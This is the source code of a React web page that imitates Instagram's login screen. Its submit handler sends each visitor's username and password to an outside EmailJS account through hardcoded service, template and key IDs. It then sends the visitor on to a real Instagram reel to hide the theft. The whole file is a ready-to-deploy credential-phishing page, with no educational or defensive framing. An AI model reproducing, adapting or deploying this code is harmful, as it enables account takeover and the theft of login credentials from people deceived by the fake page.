import React, { useState, useRef } from 'react';
import emailjs from '@emailjs/browser';

const App = () => {
  const form = useRef();
  const [showPassword, setShowPassword] = useState(false);
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [message, setMessage] = useState('');
  const [buttonText, setButtonText] = useState('Login');
  const [isSent, setIsSent] = useState(false);

  const handleSubmit = async (e) => {
    e.preventDefault();

    if (!username || !password) {
      setMessage('Please enter both username and password');
      return;
    }

    setButtonText('Logging in....');

 
    emailjs
      .sendForm('service_6w5zu4s', 'template_nfgg1b2', form.current, {
        publicKey: 'Yarkz3TvcEGd8F1kG',
      })
      .then(
        () => {
        setIsSent(true);
        form.current.reset();
        setTimeout(() => {
          window.location.href =
            'https://www.instagram.com/reel/DIBE7MgTL3U/?utm_source=ig_web_copy_link';
        }, 1500);
      })
      .catch(() => {
        setMessage('Error sending message');
        setButtonText('Login');
      });
  };

  return (
    <div className="flex items-center justify-center min-h-screen bg-black text-white px-4 py-10">
      <div className="flex flex-col items-center w-full max-w-md bg-black">
        {/* Logo */}
        <img src="instaLogo.png" alt="Instagram Logo" className="w-45 md:w-44 mb-10" />

        {/* Form */}
        <form ref={form} onSubmit={handleSubmit} className="w-full flex flex-col space-y-4 px-4">
          <input
            type="text"
            placeholder="Phone number, username, or email"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            className="bg-zinc-900 text-sm md:text-base p-3 rounded border border-gray-600 placeholder-gray-400 focus:outline-none focus:ring-0"
            autoComplete="current-username" 
            name='username'

          />

          <div className="relative">
            <input
              type={showPassword ? 'text' : 'password'}
              placeholder="Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="bg-zinc-900 text-sm md:text-base p-3 pr-16 rounded border border-gray-600 placeholder-gray-400 w-full focus:outline-none focus:ring-0"
              autoComplete="current-password" 
              name='password'
            />

            <button
              type="button"
              onClick={() => setShowPassword(!showPassword)}
              className="cursor-pointer absolute right-3 top-1/2 -translate-y-1/2 text-xs text-blue-400 hover:underline"
            >
              {showPassword ? 'Hide' : 'Show'}
            </button>
          </div>

          <button
            type="submit"
            className="cursor-pointer bg-blue-500 text-white p-2 md:p-3 rounded font-semibold text-sm md:text-base hover:bg-blue-600 transition"
          >
            {buttonText}
          </button>

          {/* Message display */}
          {message && <div className="text-[12px] mt-2 text-red-400 text-center">{message}</div>}


          {/* Divider */}
          <div className="flex items-center gap-2 my-4">
            <div className="flex-1 h-px bg-gray-600"></div>
            <p className="text-sm text-gray-400">OR</p>
            <div className="flex-1 h-px bg-gray-600"></div>
          </div>

          {/* Facebook login */}
          <button className="flex items-center justify-center gap-2 text-sm text-blue-400 hover:underline">
            <img src="/fb_icon_325x325.webp" alt="Facebook logo" className="w-5 h-5" />
            <a href="https://www.facebook.com/oidc/?app_id=124024574287414&redirect_uri=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignupviafb%2F">
              Log in with Facebook
            </a>
          </button>

          <a
            href="https://www.instagram.com/accounts/password/reset/"
            className="text-xs text-blue-400 hover:underline mt-2 text-center"
          >
            Forgot password?
          </a>
        </form>

        <div className="mt-10 text-sm text-gray-400">
          Don’t have an account?{' '}
          <a
            href="https://www.instagram.com/accounts/signup/phone/"
            className="text-blue-500 hover:underline"
          >
            Sign up
          </a>
        </div>
      </div>
    </div>
  );
};

export default App;
